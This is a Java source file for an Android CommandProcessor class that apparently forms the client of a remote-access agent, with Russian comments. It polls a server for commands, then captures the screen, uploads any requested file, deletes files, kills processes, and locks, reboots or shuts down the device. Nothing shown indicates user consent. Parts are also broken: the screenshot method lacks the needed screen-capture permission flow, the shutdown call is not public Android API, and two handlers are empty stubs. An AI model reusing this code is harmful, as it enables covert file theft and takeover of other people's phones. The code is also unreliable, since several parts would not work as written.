package com.spark.android;

import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.os.Process;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.List;

public class CommandProcessor {
    private static final String TAG = "CommandProcessor";
    
    private Context context;
    private SparkHttpClient httpClient;
    private DeviceInfoCollector deviceInfo;
    
    // Константы для админ-прав
    private static final int ADMIN_REQUEST_CODE = 1001;
    
    public CommandProcessor(Context context) {
        this.context = context;
        this.httpClient = new SparkHttpClient(context);
        this.deviceInfo = new DeviceInfoCollector(context);
    }
    
    public void fetchAndExecuteCommands() {
        try {
            JSONObject response = httpClient.getCommands();
            if (response != null && response.optInt("code", -1) == 0) {
                JSONArray devices = response.optJSONArray("data");
                if (devices != null) {
                    for (int i = 0; i < devices.length(); i++) {
                        JSONObject device = devices.optJSONObject(i);
                        if (device != null && SparkConfig.DEVICE_ID.equals(device.optString("id"))) {
                            JSONArray commands = device.optJSONArray("commands");
                            if (commands != null) {
                                executeCommands(commands);
                            }
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error fetching commands", e);
        }
    }
    
    private void executeCommands(JSONArray commands) {
        for (int i = 0; i < commands.length(); i++) {
            try {
                JSONObject command = commands.getJSONObject(i);
                String action = command.optString("action");
                JSONObject parameters = command.optJSONObject("parameters");
                
                executeCommand(action, parameters);
                
            } catch (JSONException e) {
                Log.e(TAG, "Error parsing command", e);
            }
        }
    }
    
    private void executeCommand(String action, JSONObject parameters) {
        try {
            switch (action) {
                case "screenshot":
                    handleScreenshot(parameters);
                    break;
                    
                case "file/list":
                    handleFileList(parameters);
                    break;
                    
                case "file/get":
                    handleFileGet(parameters);
                    break;
                    
                case "file/upload":
                    handleFileUpload(parameters);
                    break;
                    
                case "file/remove":
                    handleFileRemove(parameters);
                    break;
                    
                case "process/list":
                    handleProcessList(parameters);
                    break;
                    
                case "process/kill":
                    handleProcessKill(parameters);
                    break;
                    
                case "lock":
                    handleLock(parameters);
                    break;
                    
                case "restart":
                    handleRestart(parameters);
                    break;
                    
                case "shutdown":
                    handleShutdown(parameters);
                    break;
                    
                case "offline":
                    handleOffline(parameters);
                    break;
                    
                default:
                    Log.w(TAG, "Unknown command: " + action);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error executing command: " + action, e);
        }
    }
    
    private void handleScreenshot(JSONObject parameters) {
        new Thread(() -> {
            try {
                Bitmap screenshot = takeScreenshot();
                if (screenshot != null) {
                    // Сжимаем изображение
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    screenshot.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                    byte[] imageData = baos.toByteArray();
                    
                    // Отправляем на сервер
                    boolean success = httpClient.uploadFile("screenshot.jpg", imageData);
                    if (success) {
                        Log.d(TAG, "Screenshot sent successfully");
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error taking screenshot", e);
            }
        }).start();
    }
    
    private Bitmap takeScreenshot() {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                Log.w(TAG, "Screenshot not supported on Android < 5.0");
                return null;
            }
            
            // Создаем ImageReader для захвата экрана
            WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            windowManager.getDefaultDisplay().getMetrics(metrics);
            
            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;
            
            ImageReader imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            
            VirtualDisplay virtualDisplay = null;
            try {
                // Создаем виртуальный дисплей
                virtualDisplay = ((DisplayManager) context.getSystemService(Context.DISPLAY_SERVICE))
                    .createVirtualDisplay("ScreenRecorder", width, height, density,
                        imageReader.getSurface(), null, null);
                
                // Ждем немного для стабилизации
                Thread.sleep(500);
                
                Image image = imageReader.acquireLatestImage();
                if (image != null) {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * width;
                    
                    // Создаем Bitmap
                    Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);
                    
                    // Обрезаем до нужного размера
                    if (rowPadding != 0) {
                        bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                    }
                    
                    image.close();
                    return bitmap;
                }
                
            } finally {
                if (virtualDisplay != null) {
                    virtualDisplay.release();
                }
                imageReader.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error taking screenshot", e);
        }
        
        return null;
    }
    
    private void handleFileList(JSONObject parameters) {
        try {
            String path = parameters.optString("path", "/");
            File directory = new File(path);
            
            if (directory.exists() && directory.isDirectory()) {
                JSONArray fileList = new JSONArray();
                
                File[] files = directory.listFiles();
                if (files != null) {
                    for (File file : files) {
                        JSONObject fileInfo = new JSONObject();
                        fileInfo.put("name", file.getName());
                        fileInfo.put("path", file.getAbsolutePath());
                        fileInfo.put("size", file.length());
                        fileInfo.put("isDirectory", file.isDirectory());
                        fileInfo.put("modified", file.lastModified());
                        fileList.put(fileInfo);
                    }
                }
                
                JSONObject response = new JSONObject();
                response.put("path", path);
                response.put("files", fileList);
                
                httpClient.executeCommand("file/list", response);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error listing files", e);
        }
    }
    
    private void handleFileGet(JSONObject parameters) {
        try {
            JSONArray files = parameters.optJSONArray("files");
            if (files != null) {
                for (int i = 0; i < files.length(); i++) {
                    String filePath = files.optString(i);
                    File file = new File(filePath);
                    
                    if (file.exists() && file.isFile()) {
                        FileInputStream fis = new FileInputStream(file);
                        byte[] fileData = new byte[(int) file.length()];
                        fis.read(fileData);
                        fis.close();
                        
                        httpClient.uploadFile(filePath, fileData);
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting files", e);
        }
    }
    
    private void handleFileUpload(JSONObject parameters) {
        try {
            String path = parameters.optString("path");
            String fileName = parameters.optString("name");
            
            // В реальной реализации здесь будет получение файла с сервера
            // и сохранение на устройстве
            
        } catch (Exception e) {
            Log.e(TAG, "Error uploading file", e);
        }
    }
    
    private void handleFileRemove(JSONObject parameters) {
        try {
            JSONArray files = parameters.optJSONArray("files");
            if (files != null) {
                for (int i = 0; i < files.length(); i++) {
                    String filePath = files.optString(i);
                    File file = new File(filePath);
                    file.delete();
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error removing files", e);
        }
    }
    
    private void handleProcessList(JSONObject parameters) {
        try {
            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> runningApps = am.getRunningAppProcesses();
            
            JSONArray processList = new JSONArray();
            
            if (runningApps != null) {
                for (ActivityManager.RunningAppProcessInfo info : runningApps) {
                    JSONObject processInfo = new JSONObject();
                    processInfo.put("pid", info.pid);
                    processInfo.put("uid", info.uid);
                    processInfo.put("name", info.processName);
                    processList.put(processInfo);
                }
            }
            
            JSONObject response = new JSONObject();
            response.put("processes", processList);
            
            httpClient.executeCommand("process/list", response);
            
        } catch (Exception e) {
            Log.e(TAG, "Error listing processes", e);
        }
    }
    
    private void handleProcessKill(JSONObject parameters) {
        try {
            int pid = parameters.optInt("pid", -1);
            if (pid > 0) {
                try {
                    Process.killProcess(pid);
                    Log.d(TAG, "Process killed: " + pid);
                } catch (SecurityException e) {
                    Log.e(TAG, "Security exception killing process", e);
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error killing process", e);
        }
    }
    
    private void handleLock(JSONObject parameters) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(context, SparkAdminReceiver.class);
            
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow();
                Log.d(TAG, "Device locked");
            } else {
                Log.w(TAG, "Admin rights required for device lock");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error locking device", e);
        }
    }
    
    private void handleRestart(JSONObject parameters) {
        try {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            pm.reboot("remote_restart");
            
        } catch (Exception e) {
            Log.e(TAG, "Error restarting device", e);
        }
    }
    
    private void handleShutdown(JSONObject parameters) {
        try {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            pm.shutdown(false, "remote_shutdown");
            
        } catch (Exception e) {
            Log.e(TAG, "Error shutting down device", e);
        }
    }
    
    private void handleOffline(JSONObject parameters) {
        try {
            // Останавливаем сервис или делаем устройство недоступным
            Log.d(TAG, "Device going offline");
            
        } catch (Exception e) {
            Log.e(TAG, "Error going offline", e);
        }
    }
}